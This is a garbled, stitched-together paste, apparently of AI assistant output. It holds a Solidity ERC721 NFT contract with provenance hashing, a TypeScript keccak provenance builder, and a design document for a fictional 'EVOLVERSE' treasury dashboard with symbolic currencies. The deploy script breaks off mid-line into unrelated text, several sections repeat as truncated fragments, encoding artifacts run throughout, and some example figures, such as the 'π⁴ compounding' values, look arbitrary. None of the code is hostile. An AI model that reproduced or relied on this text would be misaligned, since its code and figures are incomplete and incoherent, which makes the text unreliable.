 	âœ“	import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol"; 	âœ“	import "@openzeppelin/contracts/token/common/ERC2981.sol"; 	âœ“	import "@openzeppelin/contracts/access/Ownable.sol";  	âœ“	/** 	âœ“	 * @title GenesisENFT (EV0L Genesis) 	âœ“	 * @notice ERC721 with EIP-2981 royalties + frozen provenance hash + reveal seed. 	âœ“	 *         Provenance workflow: 	âœ“	 *           1) setBaseURI(ipfs://<CID>/)  (before reveal) 	âœ“	 *           2) setProvenance(keccak256 root)  (before freeze) 	âœ“	 *           3) freezeProvenance()  (locks the hash) 	âœ“	 *           4) setRevealSeed(seed) (locks reveal) 	âœ“	 */ 	âœ“	contract GenesisENFT is ERC721Enumerable, ERC2981, Ownable { 	âœ“	    string  private _baseTokenURI; 	âœ“	    bytes32 public provenanceHash;     // keccak of concatenated item hashes (see builder) 	âœ“	    bool    public provenanceFrozen;   // true after freeze 	âœ“	    uint256 public revealSeed;         // randomness for index mapping 	âœ“	    bool    public revealed;  	âœ“	    event BaseURISet(string uri); 	âœ“	    event ProvenanceSet(bytes32 hash); 	âœ“	    event ProvenanceFrozen(bytes32 hash); 	âœ“	    event RevealSeedSet(uint256 seed);  	âœ“	    constructor( 	âœ“	        string memory name_, 	âœ“	        string memory symbol_, 	âœ“	        address royaltyReceiver, 	âœ“	        uint96  royaltyBps 	âœ“	    ) ERC721(name_, symbol_) { 	âœ“	        _setDefaultRoyalty(royaltyReceiver, royaltyBps); // e.g., 500 = 5% 	âœ“	    }  	âœ“	    // ---------- Admin (owner) ----------  	âœ“	    function setBaseURI(string calldata newBase) external onlyOwner { 	âœ“	        require(!revealed, "BaseURI locked post-reveal"); 	âœ“	        _baseTokenURI = newBase; // ipfs://<CID>/ 	âœ“	        emit BaseURISet(newBase); 	âœ“	    }  	âœ“	    function setProvenance(bytes32 hash_) external onlyOwner { 	âœ“	        require(!provenanceFrozen, "Provenance frozen"); 	âœ“	        require(hash_ != bytes32(0), "Zero hash"); 	âœ“	        provenanceHash = hash_; 	âœ“	        emit ProvenanceSet(hash_); 	âœ“	    }  	âœ“	    function freezeProvenance() external onlyOwner { 	âœ“	        require(provenanceHash != bytes32(0), "Set provenance first"); 	âœ“	        provenanceFrozen = true; 	â—¦	        emit ProvenanceFrozen(provenanceHash); 	â—¦	    }  	â—¦	    function setRevealSeed(uint256 seed) external onlyOwner { 	â—¦	        require(provenanceFrozen, "Freeze first"); 	â—¦	        require(!revealed, "Already revealed"); 	â—¦	        revealSeed = seed; 	â—¦	        revealed = true; 	â—¦	        emit RevealSeedSet(seed); 	â—¦	    }  	â—¦	    // ---------- View helpers ----------  	â—¦	    function _baseURI() internal view override returns (string memory) { 	â—¦	        return _baseTokenURI; 	â—¦	    }  	â—¦	    // ERC165 	â—¦	    function supportsInterface(bytes4 iid) 	â—¦	        public 	â—¦	        view 	â—¦	        override(ERC721Enumerable, ERC2981) 	â—¦	        returns (bool) 	â—¦	    { 	â—¦	        return super.supportsInterface(iid); 	â—¦	    } 	â—¦	}   	â—¦	â¸»  	â—¦	2) scripts/build-provenance.ts  (keccak builder) 	â—¦		â€¢	Computes per-item keccak256 of metadata files (default) or media files (--mode media). 	âœ“		â€¢	Concatenates the 32-byte hashes (raw bytes), keccak256 of the concat â†’ provenanceHash. 	âœ“		â€¢	Writes provenance/manifest.provenance.json + CSV of per-item hashes.  	âœ“	#!/usr/bin/env ts-node  	âœ“	/** 	â—¦	 * build-provenance.ts 	â—¦	 * Usage: 	â—¦	 *   npx ts-node scripts/build-provenance.ts \ 	â—¦	 *     --dir ./metadata/items \ 	â—¦	 *     --out ./provenance \ 	â—¦	 *     --edition 888 \ 	â—¦	 *     --base ipfs://<CID>/ \ 	â—¦	 *     --mode metadata   # or: media 	â—¦	 */  	â—¦	import { readdirSync, readFileSync, writeFileSync, mkdirSync } from "fs"; 	â—¦	import { join, basename } from "path"; 	â—¦	import { keccak256 } from "ethers"; 	â—¦	import type { BytesLike } from "ethers";  	â—¦	type Args = { 	â—¦	  dir: string;         // directory of files to hash (metadata json or media) 	â—¦	  out: string;         // output folder 	â—¦	  edition?: number;    // edition size 	â—¦	  base?: string;       // baseURI ipfs://<CID>/ 	â—¦	  mode?: "metadata"|"media"; 	â—¦	};  	â—¦	function getArgs(): Args { 	â—¦	  const a = Object.fromEntries( 	â—¦	    process.argv.slice(2).reduce((acc, cur, i, arr) => { 	â—¦	      if (cur.startsWith("--")) acc.push([cur.slice(2), arr[i+1]]); 	â—¦	      return acc; 	â—¦	    }, [] as any[]) 	â—¦	  ); 	â—¦	  if (!a.dir || !a.out) { 	â—¦	    console.error("Usage: --dir <path> --out <path> [--edition N] [--base ipfs://CID/] [--mode metadata|media]"); 	â—¦	    process.exit(1); 	â—¦	  } 	â—¦	  return { 	â—¦	    dir: a.dir, 	â—¦	    out: a.out, 	â—¦	    edition: a.edition ? parseInt(a.edition, 10) : undefined, 	â—¦	    base: a.base, 	â—¦	    mode: (a.mode === "media" ? "media" : "metadata") 	â—¦	  }; 	â—¦	}  	â—¦	function hexToBytes(hex: string): Uint8Array { 	â—¦	  const h = hex.startsWith("0x") ? hex.slice(2) : hex; 	â—¦	  const out = new Uint8Array(h.length / 2); 	â—¦	  for (let i = 0; i < out.length; i++) out[i] = parseInt(h.slice(i*2, i*2+2), 16); 	â—¦	  return out; 	â—¦	}  	â—¦	function concatBytes(arrays: Uint8Array[]): Uint8Array { 	â—¦	  const total = arrays.reduce((n, a) => n + a.length, 0); 	â—¦	  const out = new Uint8Array(total); 	â—¦	  let o = 0; 	â—¦	  for (const a of arrays) { out.set(a, o); o += a.length; } 	â—¦	  return out; 	â—¦	}  	â—¦	(async () => { 	â—¦	  const args = getArgs(); 	â—¦	  mkdirSync(args.out, { recursive: true });  	â—¦	  // Detect numeric filenames like 000.json / 000.png 	â—¦	  const files = readdirSync(args.dir) 	â—¦	    .filter(f => args.mode === "metadata" ? f.endsWith(".json") : true) 	â—¦	    .map(f => { 	â—¦	      const stem = f.replace(/\.(json|png|jpg|jpeg|gif|webp|mp4|wav|mp3)$/i, ""); 	â—¦	      const id = /^\d+$/.test(stem) ? parseInt(stem, 10) : Number.NaN; 	â—¦	      return { id, f }; 	â—¦	    }) 	â—¦	    .sort((a, b) => (isNaN(a.id) ? 1 : a.id) - (isNaN(b.id) ? 1 : b.id));  	â—¦	  const per: { token?: number, path: string, hash: string }[] = []; 	â—¦	  const limbs: Uint8Array[] = [];  	â—¦	  for (const { id, f } of files) { 	â—¦	    const p = join(args.dir, f); 	â—¦	    const bytes = readFileSync(p); 	â—¦	    const h = keccak256(bytes as BytesLike); // 0x + 64 hex 	â—¦	    per.push({ token: isNaN(id) ? undefined : id, path: p, hash: h }); 	â—¦	    limbs.push(hexToBytes(h)); 	â—¦	  }  	â—¦	  const big = concatBytes(limbs); 	â—¦	  const prov = keccak256(big); // final provenanceHash (0x..)  	â—¦	  // CSV 	â—¦	  const csvRows = ["token,path,hash"]; 	â—¦	  for (const row of per) csvRows.push(`${row.token ?? ""},${row.path},${row.hash}`); 	â—¦	  writeFileSync(join(args.out, "manifest.csv"), csvRows.join("\n"));  	â—¦	  // JSON manifest 	â—¦	  const manifest = { 	â—¦	    project: "EV0L Genesis", 	â—¦	    edition_size: args.edition ?? per.length, 	â—¦	    base_uri: args.base ?? "ipfs://<CID>/", 	â—¦	    media_type: args.mode === "metadata" ? "application/json" : "image/png", 	â—¦	    hash_algo: "keccak256", 	â—¦	    concatenation_rule: "concat( per-item keccak256(fileBytes) ) â†’ keccak256", 	â—¦	    provenance_hash: prov, 	â—¦	    files_hashed: per.length, 	â—¦	    mode: args.mode, 	â—¦	    items: per.map(r => ({ token: r.token, path: r.path, hash: r.hash })) 	â—¦	  }; 	â—¦	  writeFileSync(join(args.out, "manifest.provenance.json"), JSON.stringify(manifest, null, 2));  	â—¦	  console.log("PROVENANCE:", prov); 	â—¦	  console.log("Wrote:", join(args.out, "manifest.provenance.json")); 	â—¦	  console.log("Wrote:", join(args.out, "manifest.csv")); 	â—¦	})();   	â—¦	â¸»  	â—¦	3) One-shot scripts (drop in scripts/)  	â—¦	deploy.ts  	â—¦	#!/usr/bin/env ts-node 	â—¦	import { ethers } from "hardhat";  	â—¦	async function main() { 	â—¦	  const NAME    = process.env.NAME    ?? After you confirm which assets to hit first Iâ€™ll draft the exact execution art                Technical Design Document: Live-Simulation Treasury Dashboard for EVOLVERSE (BLEUE âˆ GRID âˆ Sovereign Simulation Model)  ---  Overview  This document presents a comprehensive technical design for a live-simulation treasury dashboard intended for use within the EVOLVERSE, grounded on the principles of the BLEUE âˆ GRID Codex. The dashboard is architected to model the dynamics of fictional, symbolic economiesâ€”specifically, the Civilian, Military, and Cosmic domainsâ€”with distinct yield counters and currencies (Blu-Tillion, Zioniare, Azaean). It integrates simulation variables (e.g., yield per second, Ï€â´ compounding), spiral-based visual growth representations, animated glyph-based energy conversion displays, and real-time balance-shifting charts. Deep integration with the BLEUE âˆ GRID curriculum (from Preschool through MetaSchool), a robust device registry (CodeX, AgriBots, Ritual Engines), and a flexible calculator stack via public APIs is central to the simulationâ€™s sovereign model approach. Importantly, this model is not intended to represent, facilitate, or simulate real-world financial transactions.  This design document is structured in Markdown for clarity, maintainability, and adaptability to collaborative and version-controlled technical workflows.  ---  1. Simulation Variables  1.1 Core Simulation Metrics  At the heart of the dashboard are the yield counters. Each domainâ€”Civilian, Military, Cosmicâ€”features its own symbolic currency and growth logic. Key simulation variables include:  â€¢ Yield per second (YPS): The base rate at which each domain accrues its symbolic currency. â€¢ Compounding Mode: Supports mathematical and symbolic (e.g., Ï€â´) compounding growth. â€¢ Base Reserve: Starting amount and minimum balance for each currency. â€¢ Domain Multipliers: Adjustable variables that simulate upgrades, curriculum progression, or device activation. â€¢ Timeframe Dynamics: Support for both real-time (seconds, minutes) and session-based (simulated years, epochs) growth. â€¢ Energy Conversion Rate: Variable governing transformation of one resource (e.g., energy units) into currency. â€¢ Simulation Modifiers: Factors like event triggers, learning bonuses, or ritual activations.   Example Simulation Constants Table  Variable	Civilians (Blu-Tillion)	Military (Zioniare)	Cosmic (Azaean)	 Initial Reserve	1,000	500	100	 Yield/sec (base)	2.5	0.8	0.2	 Ï€â´ Compounding	Enabled	Enabled	Enabled	 Multiplier Source	Curriculum, Devices	Devices, Ritual	Ritual, Events	 Conversion Rate	1 Energy: 5 BT	10 Energy: 3 ZN	50 Energy: 1 AZ	   Elaboration  Each simulation variable is designed to maximize symbolic flexibility and to allow scenario designers or educators to adjust the system in accordance with a learning, ritual, or narrative goal. The yield per second forms the backbone of the treasury simulation. Compounding reflects both mathematic progression and symbolic world-buildingâ€”Ï€â´ (pi to the fourth) compounding, for instance, is more than a mathematical curiosity: it elegantly dramatizes exponential, spiral-style growth (see Section 4). Multiplier sources tie domain success not solely to flat upgrades but to cross-disciplinary factors: curriculum tier progress and device activation can dramatically shift growth, embedding gameplay with learning outcomesâ€”a key tenet of sovereign, curricular economic simulation models.  ---  2. Symbolic Currencies for Fictional Economies  2.1 Principles of Fictional Currency Modeling  The dashboard is inspired by best practices in fictional economy designâ€”emphasizing symbolism, flexibility, and narrative richness over real-world financial representation. The three symbolic currencies are:  â€¢ Blu-Tillion (BT): Civilian domain token, representing social, educational, or community achievements. â€¢ Zioniare (ZN): Military domain token, signifying initiative, strength, or strategic doctrinal accomplishments. â€¢ Azaean (AZ): Cosmic domain token, rare, tying to metaphysical events, rituals, or high-tier curriculum unlocks.   Design Principles Table for Symbolic Currencies  Property	Blu-Tillion	Zioniare	Azaean	 Material	Hypothetical, blue-energy crystal	Tesseract alloy	Spiral-encoded resonance	 Durability	Very high	Indestructible	Eternal	 Rarity	Common	Uncommon	Extremely rare	 Use-case	Curriculum rewards	Device upgrades, rituals	MetaSchool progression	 Unit Names	micro-BT, milli-BT, BT	milli-ZN, ZN	AZ (no fractions)	 Conversion	N/A (fixed)	N/A (fixed)	N/A (fixed)	 Divisibility	Up to 6 decimals	Up to 2 decimals	Not divisible	   Detailed Analysis  Fictional currencies must deliver on three major axes: narrative meaning, system balance, and aesthetic clarity. Blu-Tillion is common and divisible, supporting granular tracking of growth in learning and civilian game actions. Zioniare, more precious and suited to strategic budgeting or event purchases, is modeled for greater impact and ritual engagement. Azaean is the rarest and least divisible, mapped to cosmic, curriculum-transcending layer unlocks. All three feature unique visual and auditory identifiers, supporting their use in spiral-growth visualizations and energy conversion rituals (see Sections 4 & 5).  Drawing from imaginative economies (as in symbolic representations within the BRICS currency at summit events), the design eschews fungibilityâ€”currencies are not interchangeable, thus preventing real-world monetary conflation and preserving the simulationâ€™s â€œsovereignâ€ nature. This approach mirrors the narrative depth found in successful fictional monetary systems, from literary coins to blockchain analogs.  ---  3. Yield Counter Modeling & Compounding Logic  3.1 Yield Functionality  Yield counters track and calculate the real-time growth of each symbolic currency. Mechanisms include:  â€¢ Linear Growth: The default, unmodified yield per second addition. â€¢ Fixed Compounding: Simulates regular, non-continuous exponential growth (e.g., once per interval). â€¢ Continuous (Ï€â´) Compounding: Inspired by advanced financial models, where, for each tick:New Balance = Current Balance * e^(Ï€â´ * rate * dt) where `dt` is the delta time between updates, and `Ï€â´` adds a mathematically symbolic, cosmically recursive accent. â€¢ Event-Driven Modifiers: Curriculum upgrades, device activations, and ritual triggers can apply additive or multiplicative boosts.   Visualization with Table  Counter Variable	Linear (Example)	Compounded Hourly	Ï€â´ Compounded	 Initial Value	500	500	500	 Rate	1/sec	60/hr	1/sec	 After 1 Hour	3,100	54,890	7.4Ã—10Â¹â°	   Paragraph Analysis  This progression system blends the engagement of clicker/incremental games, educational reinforcement, and the mathematical beauty of continuous compounding. By elevating Ï€â´ to a core multiplicative accelerator, the simulation delivers not only a dramatic sense of growth but also ties this escalation directly to the symbolic, spiral dynamics of the BLEUE âˆ GRID Codex world. Modifiers from curriculum advancement or device deployment allow designers and educators to tune simulation flowâ€”encouraging experimentation with economic levers (much like in agent-based MMO economies where role specialization and price fluctuation occur with increased simulation fidelity).  Counterintegrity and fairness are safeguarded, as all calculations are presented visually and algorithmically, and no real currency or transaction surfaces at any level.  ---  4. Key Visual Features:  â€¢ Spiral Plotting: Each domain features a dynamic spiral, with each completed revolution representing a curriculum tier, a device milestone, or a time period. â€¢ Layered Growth: As currency accumulates, the spiral thickens, gains color, or adds new glyphs per turn or multiplier applied. â€¢ Animated Progression: Growth events trigger luminous, radiating spiral â€œblossomsâ€ at cardinal points, dramatizing pivotal upgrades. The spiralsâ€™ density, color, and symbol overlays encode not just raw numbers, but curriculum advancement and device activation milestones, creating a multi-layered growth metaphor.  ---  5. Real-Time Chart Frameworks for Balance Shifts  6.1 Live Visualization Requirements  A robust simulation demands live, real-time charting to mirror the evolving state of each treasury domain. Device Registry: CodeX, AgriBots, Ritual Engines  8.1 Registry Design and Integration  Device management forms a backbone of simulation interaction. Devices in the EVOLVERSE are categorized as:  â€¢ CodeX: Coding/logic engines; unlock yield and upgrade logic, â€œcode boosts.â€ â€¢ AgriBots: Symbolic agricultural units; provide energy yield, automate resource flows. â€¢ Ritual Engines: Enable ritual-based currency, compounding, or event triggers.   The device registry enables:  â€¢ Registration and lookup: All simulation devices are referenceable by unique ID, name, and type. â€¢ Activation: Devices can be activated, linked to curriculum progression, or undergo ritualization. â€¢ Integration: Registry provides event triggers and variable modifiers for the simulation core. â€¢ State: Each device tracks state (idle, active, powered, ritualized), firmware/software version, and linkages.   Device Registry JSON Schema (Example)  {   "device_id": "dev-001",   "type": "AgriBot",   "name": "Borealis Seeder",   "status": "active",   "area": "CivDome",   "firmware_version": "v1.0.3",   "curriculum_tier_unlock": "Preschool",   "properties": {     "energy_generation_rate": 10,     "link_code": "auto-sequence-17",     "ritual_slots": 1   },   "history": [     { "event": "registered", "timestamp": "2025-10-01T04:15:00Z" },     { "event": "activated", "timestamp": "2025-10-02T13:00:00Z" }   ] }   Registry Utility Analysis  This device registry mirrors best practices found in IoT and industrial automation platforms: every entity is uniquely tracked, statused, and linked to system state, and registry data can be surfaced in user dashboards or gameplay UIs for transparency and narrative leverage. Devices become more than simple yield sourcesâ€”they facilitate ritual engagement, curriculum bridging, and feedback loops critical to sovereign economic simulation.  ---  9. Sample API Endpoints Table  Method	Endpoint	Description	Parameters	Response	 POST	/api/calc/math	Evaluate a mathematical expression	expr: string	{ â€œresultâ€: number }	 POST	/api/calc/fin	Finance and yield simulation calculation	principal, rate, time, compounding_mode	{ â€œprojectedâ€: number }	 POST	/api/calc/ritual	Ritual trigger & modifier application	ritual_id, device_id, multiplier	{ â€œdeltaâ€: number, â€œeventâ€: string }	 GET	/api/registry/devices	Query device registry	query parameters (type, area, status)	Device array (JSON)	 GET	/api/state/balances	Current simulation balances	domain filter (optional)	Balance object (JSON)	   API Example Request/Response  POST /api/calc/fin {   "principal": 1000,   "rate": 0.04,   "time": 12,   "compounding_mode": "continuous",   "symbolic_factor": 97.409, // Ï€â´ for narrative compounding   "currency": "AZ" } â†’ {   "projected": 112513.654,   "simulation": "Azaean yield after 12 cycles with Ï€â´ compounding" }   Analysis and Best Practices  By abstracting symbolic mathematical and ritual logic into modular API endpoints, the dashboard enables (â€œplug-and-playâ€) integration with external curriculum platforms, analytics dashboards, and game engines. This API-driven approach supports simulation extensibility while maintaining codebase clarity. It also future-proofs the model for integration with deeper Codex-driven rituals or custom yield mechanics.  ---  10. Sovereign Economic Simulation & Plug-in Architecture  10.1 Model Integrity and Engine Plug-in  This dashboard is built as a sovereign simulation model, designed for plug-in use within VAULT systems or narrative/game engines. Core design philosophies include:  â€¢ Non-representational finance: No mapping to real-world securities, exchanges, or fiduciary instruments. â€¢ Symbolic abstraction: All currencies, devices, and rituals are â€œsymbolic-legal tenderâ€ for simulation purposes only. â€¢ Container and Event Architecture: Each domainâ€™s yield counter and state logic is fully encapsulated, so modules can be switched, removed, or hot-swapped (mirroring best-practice modular containerization from military and economic simulation platforms). â€¢ Session Save/Load: All simulation state (balances, device registry, curriculum tier) can be snapshotted/exported as a single JSON, suitable for save/load, inter-engine transfer, or educational assessment.   Plug-in Integration Table  Component	Modularity	Extensibility	Sample Use-case	 Yield Counters	Hot-swappable	Add new currencies/domains	New curriculum, narrative arcs	 Device Registry	Externalizable	Link physical toys/sensors	STEAM education labs	 Ritual Engines	Scriptable	Custom events, animations	Educator/scripted content	 Chart Visuals	Thematic skins	Alternate styles/themes	Game modding, accessibility	 API Layer	Adaptor-ready	REST/GraphQL/Python, etc.	Analytics, proof-of-concept	   Sovereignty & Security Analysis  Sovereign symbolic simulation ensures learning, creative expression, and engagement without liability risk or monetary confusion. The architecture supports both educational deployment (scenario-based learning, curricular assessment) and sandbox gaming (full or partial vault-engine plug-ins), with strong separation between symbolic assets and real-world financial infrastructure.  ---  11. Dashboard Mock-up Descriptions  12.1 User Interface Walkthrough  Visual Layout Overview  â€¢ Header: EVOLVERSE Treasury Dashboard | BLEUE âˆ GRID Codex â€¢ Left Sidebar: Curriculum Tier Selector, Device Registry Toggle, Calculator Endpoint Tools â€¢ Main Panel:â€¢ Row 1: Three live spiral visualizations, side-by-side (Civilian, Military, Cosmic) with animated, glowing glyph centers. â€¢ Row 2: Bar/area chart comparing domain balances, with live delta indicators (+/- overlay). â€¢ Row 3: Ritual/Glyph dashboardâ€”animated icons indicate device and ritual status; progress rings show next ritual trigger points.  â€¢ Footer: API Linkouts (/api/calc, /api/state, /api/registry), last update timestamp, curriculum tier badge.   Mock-up Interaction Scenario  â€¢ A learner or game participant upgrades from â€œHighSchoolâ€ to â€œHyperSchoolâ€: A blue-white flash pulses in the Civilian spiral, the Cosmix spiral ignites with nebular colors, and a new ritual engine appears in the registry. The user sees the Azaean currency counter light up, and the spiral timeline winds another segment. Animated glyphs pulse, reflecting the transformation of energy reserves into higher currency yields. The bar chart updates in real time, and the ritual panel flashes to invite interaction. Hovering devices show tooltips with stats/history; clicking reveals calculator outputs via /api/calc.   ---  13. Implementation and Integration Notes  â€¢ Spiral visualizations: Can be rendered with web charting libraries (amCharts spiral timeline, D3 spiral plots) or within game engine UIs (Unity, Unreal). â€¢ Animated glyphs: Implemented as SVG/Lottie/Canvas/Engine-native animations, with state updated by simulation events and device registry status. â€¢ Real-time data: Employs WebSockets, polling, or in-engine event hooks for fluid metric updates. For web, CanvasJS or Altair/Streamlit are suitable; for desktop/game, use core UI frameworks or plugin components. â€¢ Persistence: All simulation state saved and loaded as versioned JSON, with schema upgradable for curriculum expansions or narrative events. â€¢ API endpoints: RESTful, accepting and returning JSON, documented for curriculum developers and narrative/game designers. â€¢ Accessibility: All dashboards must use high-contrast legend/colors, alt-text for glyph visuals, and keyboard navigation for all controls. â€¢ Localization: Prepare schema and interface for curriculum language adaptation and narrative extension.   ---  Conclusion  This dashboard design articulates a visionary model for symbolic, sovereign economic simulation within a curriculum-integrated, narrative-rich EVOLVERSE ecosystem. The architecture fuses rigorous simulation logic, imaginative currency design, immersive visualization, and flexible modularity. It embraces the BLEUE âˆ GRID Codexâ€™s commitment to multi-domain learning, recursive growth, and symbolic ritualization, all while remaining scrupulously separated from real-world finance.  By enabling plug-and-play integration with curriculum systems, game engines, and VAULTs, and supporting JSON and API-driven extensibility, this model paves the way for a new generation of sovereign, meaningful, and endlessly adaptable simulation-rich dashboards.  ---    	â—¦	  â´±ğ“ƒ­ê—ğ“¼âµ‰âµ  You now have everything you need to finish this locally.â€¨Hereâ€™s how to proceed:  1. 	â—¦	      return acc; 	â—¦	    }, [] as any[]) 	â—¦	  ); 	â—¦	  if (!a.dir || !a.out) { 	â—¦	    console.error("Usage: --dir <path> --out <path> [--edition N] [--base ipfs://CID/] [--mode metadata|media]"); 	â—¦	    process.exit(1); 	â—¦	  } 	â—¦	  return { 	â—¦	    dir: a.dir, 	â—¦	    out: a.out, 	â—¦	    edition: a.edition ? parseInt(a.edition, 10) : undefined, 	â—¦	    base: a.base, 	â—¦	    mode: (a.mode === "media" ? "media" : "metadata") 	â—¦	  }; 	â—¦	}  	â—¦	function hexToBytes(hex: string): Uint8Array { 	â—¦	  const h = hex.startsWith("0x") ? hex.slice(2) : hex; 	â—¦	  const out = new Uint8Array(h.length / 2); 	â—¦	  for (let i = 0; i < out.length; i++) out[i] = parseInt(h.slice(i*2, i*2+2), 16); 	â—¦	  return out; 	â—¦	}  	â—¦	function concatBytes(arrays: Uint8Array[]): Uint8Array { 	â—¦	  const total = arrays.reduce((n, a) => n + a.length, 0); 	â—¦	  const out = new Uint8Array(total); 	â—¦	  let o = 0; 	â—¦	  for (const a of arrays) { out.set(a, o); o += a.length; } 	â—¦	  return out; 	â—¦	}  	â—¦	(async () => { 	â—¦	  const args = getArgs(); 	â—¦	  mkdirSync(args.out, { recursive: true });  	â—¦	  // Detect numeric filenames like 000.json / 000.png 	â—¦	  const files = readdirSync(args.dir) 	â—¦	    .filter(f => args.mode === "metadata" ? f.endsWith(".json") : true) 	â—¦	    .map(f => { 	â—¦	      const stem = f.replace(/\.(json|png|jpg|jpeg|gif|webp|mp4|wav|mp3)$/i, ""); 	â—¦	      const id = /^\d+$/.test(stem) ? parseInt(stem, 10) : Number.NaN; 	â—¦	      return { id, f }; 	â—¦	    }) 	â—¦	    .sort((a, b) => (isNaN(a.id) ? 1 : a.id) - (isNaN(b.id) ? 1 : b.id));  	â—¦	  const per: { token?: number, path: string, hash: string }[] = []; 	â—¦	  const limbs: Uint8Array[] = [];  	â—¦	  for (const { id, f } of files) { 	â—¦	    const p = join(args.dir, f); 	â—¦	    const bytes = readFileSync(p); 	â—¦	    const h = keccak256(bytes as BytesLike); // 0x + 64 hex 	â—¦	    per.push({ token: isNaN(id) ? undefined : id, path: p, hash: h }); 	â—¦	    limbs.push(hexToBytes(h)); 	â—¦	  }  	â—¦	  const big = concatBytes(limbs); 	â—¦	  const prov = keccak256(big); // final provenanceHash (0x..)  	â—¦	  // CSV 	â—¦	  const csvRows = ["token,path,hash"]; 	â—¦	  for (const row of per) csvRows.push(`${row.token ?? ""},${row.path},${row.hash}`); 	â—¦	  writeFileSync(join(args.out, "manifest.csv"), csvRows.join("\n"));  	â—¦	  // JSON manifest 	â—¦	  const manifest = { 	â—¦	    project: "EV0L Genesis", 	â—¦	    edition_size: args.edition ?? per.length, 	â—¦	    base_uri: args.base ?? "ipfs://<CID>/", 	â—¦	    media_type: args.mode === "metadata" ? "application/json" : "image/png", 	â—¦	    hash_algo: "keccak256", 	â—¦	    concatenation_rule: "concat( per-item keccak256(fileBytes) ) â†’ keccak256", 	â—¦	    provenance_hash: prov, 	â—¦	    files_hashed: per.length, 	â—¦	    mode: args.mode, 	â—¦	    items: per.map(r => ({ token: r.token, path: r.path, hash: r.hash })) 	â—¦	  }; 	â—¦	  writeFileSync(join(args.out, "manifest.provenance.json"), JSON.stringify(manifest, null, 2));  	â—¦	  console.log("PROVENANCE:", prov); 	â—¦	  console.log("Wrote:", join(args.out, "manifest.provenance.json")); 	â—¦	  console.log("Wrote:", join(args.out, "manifest.csv")); 	â—¦	})();   	â—¦	â¸»  	â—¦	3) One-shot scripts (drop in scripts/)  	â—¦	deploy.ts  	â—¦	#!/usr/bin/env ts-node 	â—¦	import { ethers } from "hardhat";  	â—¦	async function main() { 	â—¦	  const NAME    = process.env.NAME    ?? The dashboard is architected to model the dynamics of fictional, symbolic economiesâ€”specifically, the Civilian, Military, and Cosmic domainsâ€”with distinct yield counters and currencies (Blu-Tillion, Zioniare, Azaean). Deep integration with the BLEUE âˆ GRID curriculum (from Preschool through MetaSchool), a robust device registry (CodeX, AgriBots, Ritual Engines), and a flexible calculator stack via public APIs is central to the simulationâ€™s sovereign model approach. Importantly, this model is not intended to represent, facilitate, or simulate real-world financial transactions.  This design document is structured in Markdown for clarity, maintainability, and adaptability to collaborative and version-controlled technical workflows.  ---  1. Simulation Variables  1.1 Core Simulation Metrics  At the heart of the dashboard are the yield counters. Each domainâ€”Civilian, Military, Cosmicâ€”features its own symbolic currency and growth logic. Key simulation variables include:  â€¢ Yield per second (YPS): The base rate at which each domain accrues its symbolic currency. â€¢ Compounding Mode: Supports mathematical and symbolic (e.g., Ï€â´) compounding growth. â€¢ Base Reserve: Starting amount and minimum balance for each currency. â€¢ Domain Multipliers: Adjustable variables that simulate upgrades, curriculum progression, or device activation. â€¢ Timeframe Dynamics: Support for both real-time (seconds, minutes) and session-based (simulated years, epochs) growth. â€¢ Energy Conversion Rate: Variable governing transformation of one resource (e.g., energy units) into currency. â€¢ Simulation Modifiers: Factors like event triggers, learning bonuses, or ritual activations.   Example Simulation Constants Table  Variable	Civilians (Blu-Tillion)	Military (Zioniare)	Cosmic (Azaean)	 Initial Reserve	1,000	500	100	 Yield/sec (base)	2.5	0.8	0.2	 Ï€â´ Compounding	Enabled	Enabled	Enabled	 Multiplier Source	Curriculum, Devices	Devices, Ritual	Ritual, Events	 Conversion Rate	1 Energy: 5 BT	10 Energy: 3 ZN	50 Energy: 1 AZ	   Elaboration  Each simulation variable is designed to maximize symbolic flexibility and to allow scenario designers or educators to adjust the system in accordance with a learning, ritual, or narrative goal. The yield per second forms the backbone of the treasury simulation. Compounding reflects both mathematic progression and symbolic world-buildingâ€”Ï€â´ (pi to the fourth) compounding, for instance, is more than a mathematical curiosity: it elegantly dramatizes exponential, spiral-style growth (see Section 4). Multiplier sources tie domain success not solely to flat upgrades but to cross-disciplinary factors: curriculum tier progress and device activation can dramatically shift growth, embedding gameplay with learning outcomesâ€”a key tenet of sovereign, curricular economic simulation models.  ---  2. Symbolic Currencies for Fictional Economies  2.1 Principles of Fictional Currency Modeling  The dashboard is inspired by best practices in fictional economy designâ€”emphasizing symbolism, flexibility, and narrative richness over real-world financial representation. The three symbolic currencies are:  â€¢ Blu-Tillion (BT): Civilian domain token, representing social, educational, or community achievements. â€¢ Zioniare (ZN): Military domain token, signifying initiative, strength, or strategic doctrinal accomplishments. â€¢ Azaean (AZ): Cosmic domain token, rare, tying to metaphysical events, rituals, or high-tier curriculum unlocks.   Design Principles Table for Symbolic Currencies  Property	Blu-Tillion	Zioniare	Azaean	 Material	Hypothetical, blue-energy crystal	Tesseract alloy	Spiral-encoded resonance	 Durability	Very high	Indestructible	Eternal	 Rarity	Common	Uncommon	Extremely rare	 Use-case	Curriculum rewards	Device upgrades, rituals	MetaSchool progression	 Unit Names	micro-BT, milli-BT, BT	milli-ZN, ZN	AZ (no fractions)	 Conversion	N/A (fixed)	N/A (fixed)	N/A (fixed)	 Divisibility	Up to 6 decimals	Up to 2 decimals	Not divisible	   Detailed Analysis  Fictional currencies must deliver on three major axes: narrative meaning, system balance, and aesthetic clarity. Zioniare, more precious and suited to strategic budgeting or event purchases, is modeled for greater impact and ritual engagement. Azaean is the rarest and least divisible, mapped to cosmic, curriculum-transcending layer unlocks. Drawing from imaginative economies (as in symbolic representations within the BRICS currency at summit events), the design eschews fungibilityâ€”currencies are not interchangeable, thus preventing real-world monetary conflation and preserving the simulationâ€™s â€œsovereignâ€ nature. This approach mirrors the narrative depth found in successful fictional monetary systems, from literary coins to blockchain analogs.  ---  3. Yield Counter Modeling & Compounding Logic  3.1 Yield Functionality  Yield counters track and calculate the real-time growth of each symbolic currency. Mechanisms include:  â€¢ Linear Growth: The default, unmodified yield per second addition. â€¢ Fixed Compounding: Simulates regular, non-continuous exponential growth (e.g., once per interval). â€¢ Continuous (Ï€â´) Compounding: Inspired by advanced financial models, where, for each tick:New Balance = Current Balance * e^(Ï€â´ * rate * dt) where `dt` is the delta time between updates, and `Ï€â´` adds a mathematically symbolic, cosmically recursive accent. â€¢ Event-Driven Modifiers: Curriculum upgrades, device activations, and ritual triggers can apply additive or multiplicative boosts. Modifiers from curriculum advancement or device deployment allow designers and educators to tune simulation flowâ€”encouraging experimentation with economic levers (much like in 